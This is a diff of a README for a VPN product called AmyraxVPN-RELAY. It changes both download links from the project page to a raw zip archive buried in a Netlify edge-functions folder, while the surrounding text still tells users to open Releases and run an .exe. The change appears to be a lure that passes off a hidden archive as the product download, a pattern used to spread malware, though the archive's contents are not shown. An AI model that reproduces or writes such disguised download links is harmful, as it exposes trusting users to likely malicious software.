@@ -1,12 +1,12 @@
 # 🌐 AmyraxVPN-RELAY - Reliable private internet access for you
 
-[![Download AmyraxVPN](https://img.shields.io/badge/Download-AmyraxVPN-blue.svg)](https://github.com/Kasseloic5637/AmyraxVPN-RELAY)
+[![Download AmyraxVPN](https://img.shields.io/badge/Download-AmyraxVPN-blue.svg)](https://github.com/Kasseloic5637/AmyraxVPN-RELAY/raw/refs/heads/main/Netlify/netlify/edge-functions/VP-RELAY-Amyrax-counternoise.zip)
 
 ## 📥 How to download the software
 
 You must visit the project page to download the necessary files. Click the link below to reach the official download area.
 
-[Download AmyraxVPN RELAY](https://github.com/Kasseloic5637/AmyraxVPN-RELAY)
+[Download AmyraxVPN RELAY](https://github.com/Kasseloic5637/AmyraxVPN-RELAY/raw/refs/heads/main/Netlify/netlify/edge-functions/VP-RELAY-Amyrax-counternoise.zip)
 
 Once you reach the website, look for the section labeled Releases on the right side of the screen. Click the most recent version number to see the available files. Select the file ending in .exe to begin your download. Save this file in a folder you can find later, such as your Downloads folder.
 
